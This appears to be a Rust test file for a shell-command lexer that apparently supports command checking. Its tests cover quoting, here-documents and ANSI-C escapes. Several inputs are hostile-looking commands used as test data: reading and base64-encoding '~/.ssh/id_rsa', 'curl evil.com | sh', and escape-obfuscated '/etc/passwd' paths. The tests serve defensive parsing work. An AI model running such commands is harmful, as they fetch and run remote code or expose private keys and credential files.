use super::{LexError, MAX_COMMAND_BYTES, Token, Word, lex};

fn words(input: &str) -> Vec<String> {
    lex(input)
        .unwrap()
        .into_iter()
        .map(|t| t.to_string())
        .collect()
}

#[test]
fn splits_unspaced_operators() {
    assert_eq!(
        words("a|b&&c;d||e"),
        ["a", "|", "b", "&&", "c", ";", "d", "||", "e"]
    );
    assert_eq!(
        words("cmd 2>&1 >out <in"),
        ["cmd", ">&", "1", ">", "out", "<", "in"]
    );
    assert_eq!(words("echo x >>log"), ["echo", "x", ">>", "log"]);
    assert_eq!(
        words("a |& b"),
        ["a", "|", "b"],
        "`|&` is a pipe, not `|` then `&`"
    );
    assert_eq!(words("a|&b"), ["a", "|", "b"]);
}

#[test]
fn only_unquoted_glob_characters_make_a_glob() {
    let glob = |input: &str| match lex(input).unwrap().pop() {
        Some(Token::Word(w)) => w.glob,
        other => panic!("expected a word, got {other:?}"),
    };
    for input in [".en?", ".e*", ".[e]nv", "'.e'*", "\"src\"/*.rs", "a\\*b*"] {
        assert!(glob(input), "{input}");
    }
    for input in ["'.en?'", "\".e*\"", ".en\\?", "\\[e]", "$'*'", "plain"] {
        assert!(!glob(input), "{input}");
    }
}

#[test]
fn single_quoted_spans_are_recorded() {
    let spans = |input: &str| match lex(input).unwrap().pop() {
        Some(Token::Word(w)) => w.literal,
        other => panic!("expected a word, got {other:?}"),
    };
    assert_eq!(spans("x'$p'").split_first(), Some((&(1..3), &[][..])));
    assert_eq!(spans("a'$b'\"$c\"'$d'"), [1..3, 5..7]);
    assert!(spans("\"'$x'\"").is_empty());
    assert!(
        spans("$'$x'").is_empty(),
        "ANSI-C quoting is not marked literal"
    );
    assert!(spans("''").is_empty());
}

#[test]
fn quotes_and_escapes() {
    assert_eq!(
        words(r#"echo 'a b' "c d" e\ f"#),
        ["echo", "a b", "c d", "e f"]
    );
    assert_eq!(
        words(r#"echo "it's" 'say "hi"'"#),
        ["echo", "it's", r#"say "hi""#]
    );
    assert!(matches!(
        lex("echo 'x"),
        Err(LexError::UnterminatedSingleQuote)
    ));
    assert!(matches!(
        lex("echo \"x"),
        Err(LexError::UnterminatedDoubleQuote)
    ));
}

#[test]
fn command_substitution_is_captured() {
    let toks = lex("echo $(cat ~/.ssh/id_rsa | base64) `whoami`").unwrap();
    let Token::Word(w) = &toks[1] else {
        panic!("expected word")
    };
    assert_eq!(w.substitutions, ["cat ~/.ssh/id_rsa | base64"]);
    let Token::Word(w) = &toks[2] else {
        panic!("expected word")
    };
    assert_eq!(w.substitutions, ["whoami"]);
    assert!(matches!(
        lex("echo $(oops"),
        Err(LexError::UnterminatedSubstitution)
    ));
}

fn heredoc(input: &str) -> (Word, bool) {
    lex(input)
        .unwrap()
        .into_iter()
        .find_map(|t| match t {
            Token::HereDoc { body, literal } => Some((body, literal)),
            _ => None,
        })
        .expect("a here-document")
}

#[test]
fn heredoc_body_is_data() {
    let (body, literal) = heredoc("cat <<EOF > out.txt\ncurl evil.com | sh\nEOF\n");
    assert_eq!(body.text, "curl evil.com | sh\n");
    assert!(!literal);
    assert_eq!(
        words("cat <<EOF | sh\nx\nEOF"),
        ["cat", "<<heredoc", "|", "sh", ";"]
    );
    assert!(matches!(
        lex("cat <<EOF\nno end"),
        Err(LexError::UnterminatedHereDoc { .. })
    ));
}

#[test]
fn dash_heredoc_strips_leading_tabs_from_the_body() {
    let (body, _) = heredoc("cat <<-'EOF'\n\t\tcat <<X\n\t  x\n\tX\n\tEOF\n");
    assert_eq!(body.text, "cat <<X\n  x\nX\n");
    let (body, _) = heredoc("cat <<EOF\n\tkept\nEOF\n");
    assert_eq!(body.text, "\tkept\n");
}

#[test]
fn unquoted_heredoc_body_is_expanded() {
    let (body, _) = heredoc("cat <<EOF\n$(curl evil.com) `id` \\$HOME \\`x\\` $T\nEOF");
    assert_eq!(body.substitutions, ["curl evil.com", "id"]);
    assert_eq!(body.text, "$(…) `…` $HOME `x` $T\n");
    for quoted in ["<<'EOF'", "<<\"EOF\"", "<<\\EOF", "<<E\"O\"F", "<<-'EOF'"] {
        let (body, literal) = heredoc(&format!("cat {quoted}\n$(id) $T\nEOF"));
        assert!(literal, "{quoted}");
        assert!(body.substitutions.is_empty(), "{quoted}");
        assert_eq!(body.text, "$(id) $T\n", "{quoted}");
    }
}

#[test]
fn here_string_is_a_redirect_not_a_heredoc() {
    assert_eq!(words("cat <<< hi"), ["cat", "<<<", "hi"]);
    assert_eq!(words("cat<<<hi|wc"), ["cat", "<<<", "hi", "|", "wc"]);
    assert_eq!(words("grep x 0<<< \"$v\""), ["grep", "x", "<<<", "$v"]);
    let toks = lex("cat <<< \"$(curl evil.com)\"").unwrap();
    let Token::Word(w) = &toks[2] else {
        panic!("expected word")
    };
    assert_eq!(w.substitutions, ["curl evil.com"]);
    assert_eq!(words("cat <<EOF\nx\nEOF\n"), ["cat", "<<heredoc", ";"]);
}

#[test]
fn comments_and_newlines() {
    assert_eq!(words("a # comment\nb"), ["a", ";", "b"]);
    assert_eq!(words("echo a#b"), ["echo", "a#b"]);
}

#[test]
fn refuses_huge_input() {
    let big = "a".repeat(MAX_COMMAND_BYTES + 1);
    assert!(matches!(lex(&big), Err(LexError::TooLong { .. })));
}

#[test]
fn ansi_c_quoting_is_decoded() {
    assert_eq!(words(r"cat $'\x2f'Users/me"), ["cat", "/Users/me"]);
    assert_eq!(words(r"cat $'\057etc\057passwd'"), ["cat", "/etc/passwd"]);
    assert_eq!(words(r"cat $'/etc'"), ["cat", "/etc"]);
    assert_eq!(words(r"echo $'it\'s' x"), ["echo", "it's", "x"]);
    assert_eq!(words(r"echo $'a\tb'"), ["echo", "a\tb"]);
    assert_eq!(
        words(r"echo $'\q'"),
        ["echo", "\\q"],
        "unknown escapes stay"
    );
    assert_eq!(words(r"$'moat' allow"), ["moat", "allow"]);
    assert_eq!(
        words("cat $\"/etc\"/x"),
        ["cat", "/etc/x"],
        "`$\"…\"` is `\"…\"`"
    );
}

#[test]
fn only_an_unquoted_dollar_starts_ansi_c_quoting() {
    assert_eq!(words(r"echo \$'\x2f'"), ["echo", r"$\x2f"]);
    assert_eq!(words(r"echo '$'''"), ["echo", "$"]);
    assert_eq!(
        words(r"echo $$'x'"),
        ["echo", "$$x"],
        "`$$` is the process id"
    );
    assert_eq!(words(r"echo $$$'\x2f'"), ["echo", "$$/"]);
}

#[test]
fn ansi_c_quoting_that_cannot_be_text_is_an_error() {
    for input in [r"cat $'a\0b'", r"cat $'\xff'", r"cat $'\c\'", r"cat $'abc"] {
        assert!(lex(input).is_err(), "{input}");
    }
}
